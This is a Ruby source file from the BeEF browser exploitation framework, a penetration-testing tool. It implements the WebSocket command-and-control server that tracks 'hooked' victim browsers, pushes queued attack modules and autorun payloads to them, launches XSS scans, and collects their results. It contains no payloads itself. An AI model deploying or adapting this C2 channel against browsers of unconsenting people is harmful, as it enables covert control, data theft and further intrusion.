#
# Copyright (c) 2006-2023 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Core
    module Websocket
      require 'singleton'
      require 'json'
      require 'base64'
      require 'em-websocket'
      require 'socket'

      class Websocket
        include Singleton
        include BeEF::Core::Handlers::Modules::Command

        @@activeSocket = {}
        @@lastalive = {}
        @@config = BeEF::Core::Configuration.instance
        @@debug = @@config.get('beef.http.debug')

        MOUNTS = BeEF::Core::Server.instance.mounts

        def initialize
          return unless @@config.get('beef.http.websocket.enable')

          secure = @@config.get('beef.http.websocket.secure')

          # @note Start a WSS server socket
          if secure
            cert_key = @@config.get('beef.http.https.key')
            cert_key = File.expand_path cert_key, $root_dir unless cert_key.start_with? '/'
            unless File.exist? cert_key
              print_error "Error: #{cert_key} does not exist"
              exit 1
            end

            cert = @@config.get('beef.http.https.cert')
            cert = File.expand_path cert, $root_dir unless cert.start_with? '/'
            unless File.exist? cert
              print_error "Error: #{cert} does not exist"
              exit 1
            end

            ws_secure_options = {
              host: @@config.get('beef.http.host'),
              port: @@config.get('beef.http.websocket.secure_port'),
              secure: true,
              tls_options: {
                cert_chain_file: cert,
                private_key_file: cert_key
              }
            }
            start_websocket_server(ws_secure_options)
          end

          # @note Start a WS server socket
          ws_options = {
            host: @@config.get('beef.http.host'),
            port: @@config.get('beef.http.websocket.port'),
            secure: false
          }
          start_websocket_server(ws_options)
        end

        def start_websocket_server(ws_options)
          secure = ws_options[:secure] || false

          Thread.new do
            # prevent issues when starting at the same time
            # the TunnelingProxy, Thin and Evented WebSockets
            sleep 2

            EventMachine.run do
              EventMachine::WebSocket.start(ws_options) do |ws|
                ws.onopen do |_handshake|
                  print_debug("[WebSocket] New #{secure ? 'WebSocketSecure' : 'WebSocket'} channel open.")
                end

                ws.onerror do |error|
                  print_error "[WebSocket] Error: #{error}"
                end

                ws.onclose do |msg|
                  print_debug "[WebSocket] Connection closed: #{msg}"
                end

                ws.onmessage do |msg, _type|
                  begin
                    msg_hash = JSON.parse(msg)
                    print_debug "[WebSocket] New message: #{msg_hash}" if @@debug
                  rescue StandardError => e
                    print_error "[WebSocket] Failed parsing WebSocket message: #{e.message}"
                    print_error e.backtrace
                    next
                  end

                  # new zombie
                  unless msg_hash['cookie'].nil?
                    print_debug('[WebSocket] Browser says hello! WebSocket is running')
                    # insert new connection in activesocket
                    @@activeSocket[(msg_hash['cookie']).to_s] = ws
                    print_debug("[WebSocket] activeSocket content [#{@@activeSocket}]")

                    hb_session = msg_hash['cookie']
                    hooked_browser = BeEF::Core::Models::HookedBrowser.where(session: hb_session).first
                    if hooked_browser.nil?
                      print_error '[WebSocket] Fingerprinting not finished yet.'
                      print_more 'ARE rules were not triggered. You may want to trigger them manually via REST API.'
                      next
                    end

                    BeEF::Core::AutorunEngine::Engine.instance.find_and_run_all_matching_rules_for_zombie(hooked_browser.id)

                    next
                  end

                  # polling zombie
                  unless msg_hash['alive'].nil?
                    hooked_browser = BeEF::Core::Models::HookedBrowser.where(session: msg_hash['alive']).first

                    # This will happen if you reset BeEF database (./beef -x),
                    # and existing zombies try to connect. These zombies will be ignored,
                    # as they are unknown and presumed invalid.
                    #
                    # @todo: consider fixing this. add zombies instead of ignoring them
                    #        and report "Hooked browser X appears to have come back online"
                    if hooked_browser.nil?
                      # print_error "Could not find zombie with ID #{msg_hash['alive']}"
                      next
                    end

                    hooked_browser.lastseen = Time.new.to_i
                    hooked_browser.count!
                    hooked_browser.save!

                    # Check if new modules need to be sent
                    zombie_commands = BeEF::Core::Models::Command.where(hooked_browser_id: hooked_browser.id, instructions_sent: false)
                    zombie_commands.each { |command| add_command_instructions(command, hooked_browser) }

                    # Check if there are any ARE rules to be triggered. If is_sent=false rules are triggered
                    are_body = ''
                    are_executions = BeEF::Core::Models::Execution.where(is_sent: false, session_id: hooked_browser.session)
                    are_executions.each do |are_exec|
                      are_body += are_exec.mod_body
                      are_exec.update(is_sent: true, exec_time: Time.new.to_i)
                    end
                    @@activeSocket[hooked_browser.session].send(are_body) unless are_body.empty?

                    # @todo antisnatchor:
                    # @todo - re-use the pre_hook_send callback mechanisms to have a generic check for multipl extensions
                    # Check if new forged requests need to be sent (Requester/TunnelingProxy)
                    if @@config.get('beef.extension.requester.loaded')
                      dhook = BeEF::Extension::Requester::API::Hook.new
                      dhook.requester_run(hooked_browser, '')
                    end

                    # Check if new XssRays scan need to be started
                    if @@config.get('beef.extension.xssrays.loaded')
                      xssrays = BeEF::Extension::Xssrays::API::Scan.new
                      xssrays.start_scan(hooked_browser, '')
                    end

                    next
                  end

                  # received request for a specific handler
                  # the zombie is probably trying to return command module results
                  # or call back to a running BeEF extension
                  unless msg_hash['handler'].nil?
                    # Call the handler for websocket cmd response
                    # Base64 decode, parse JSON, and forward
                    execute(msg_hash)
                    next
                  end

                  print_error "[WebSocket] Unexpected WebSocket message: #{msg_hash}"
                end
              end
            end
          end
        rescue StandardError => e
          print_error "[WebSocket] Error: #{e.message}"
          raise e
        end

        #
        # @note retrieve the right websocket channel given an hooked browser session
        # @param [String] session the hooked browser session
        #
        def getsocket(session)
          !@@activeSocket[session].nil?
        end

        #
        # @note send a function to hooked and ws browser
        # @param [String] fn the module to execute
        # @param [String] session the hooked browser session
        #
        def send(fn, session)
          @@activeSocket[session].send(fn)
        end

        #
        # Call the handler for websocket cmd response
        #
        # @param [Hash] data contains the answer of a command
        #
        # @example data hash:
        #
        # {"handler"=>"/command/test_beef_debug.js",
        # "cid"=>"1",
        # "result"=>
        #  "InJlc3VsdD1jYWxsZWQgdGhlIGJlZWYuZGVidWcoKSBmdW5jdGlvbi4gQ2hlY2sgdGhlIGRldmVsb3BlciBjb25zb2xlIGZvciB5b3VyIGRlYnVnIG1lc3NhZ2UuIg==",
        # "status"=>"undefined",
        # "callback"=>"undefined",
        # "bh"=>
        #  "jkERa2PIdTtwnwxheXiiGZsm4ukfAD6o84LpgcJBW0g7S8fIh0Uq1yUZxnC0Cr163FxPWCpPN3uOVyPZ"}
        # => {"handler"=>"/command/test_beef_debug.js", "cid"=>"1", "result"=>"InJlc3VsdD1jYWxsZWQgdGhlIGJlZWYuZGVidWcoKSBmdW5jdGlvbi4gQ2hlY2sgdGhlIGRldmVsb3BlciBjb25zb2xlIGZvciB5b3VyIGRlYnVnIG1lc3NhZ2UuIg==", "status"=>"undefined", "callback"=>"undefined", "bh"=>"jkERa2PIdTtwnwxheXiiGZsm4ukfAD6o84LpgcJBW0g7S8fIh0Uq1yUZxnC0Cr163FxPWCpPN3uOVyPZ"}
        #
        def execute(data)
          print_debug data.inspect if @@debug

          hooked_browser = data['bh']
          unless BeEF::Filters.is_valid_hook_session_id?(hooked_browser)
            print_error '[Websocket] BeEF hook is invalid'
            return
          end

          command_id = data['cid'].to_s
          unless BeEF::Filters.nums_only?(command_id)
            print_error '[Websocket] command_id is invalid'
            return
          end
          command_id = command_id.to_i

          handler = data['handler']
          if handler.to_s.strip == ''
            print_error '[Websocket] handler is invalid'
            return
          end

          case data['status']
          when '0', 'undefined'
            status = 0
          when '1'
            status = 1
          when '2'
            status = 2
          else
            print_error '[Websocket] command status is invalid'
            return
          end

          command_results = {}

          command_results['data'] = JSON.parse(Base64.decode64(data['result']).force_encoding('UTF-8'))

          if command_results.empty?
            print_error '[Websocket] command results are empty'
            return
          end

          command_mod = "beef.module.#{handler.gsub('/command/', '').gsub('.js', '')}"
          command_name = @@config.get("#{command_mod}.class")

          # process results from command module
          if handler.start_with?('/command/')
            command = BeEF::Core::Command.const_get(command_name.capitalize)
            command_obj = command.new(BeEF::Module.get_key_by_class(command_name))
            command_obj.session_id = hooked_browser
            command_obj.build_callback_datastore(
              command_results['data'],
              command_id,
              hooked_browser,
              nil,
              nil
            )

            command_obj.post_execute if command_obj.respond_to?(:post_execute)

            BeEF::Core::Models::Command.save_result(
              hooked_browser,
              command_id,
              @@config.get("#{command_mod}.name"),
              command_results,
              status
            )
          else # processing results from extensions, call the right handler
            data['beefhook'] = hooked_browser
            data['results'] = command_results['data']

            if MOUNTS.has_key?(handler)
              if MOUNTS[handler].instance_of?(Array) and MOUNTS[handler].length == 2
                MOUNTS[handler][0].new(data, MOUNTS[handler][1])
              else
                MOUNTS[handler].new(data)
              end
            end
          end
        rescue StandardError => e
          print_error "Error in BeEF::Core::Websocket: #{e.message}"
          raise e
        end
      end
    end
  end
end
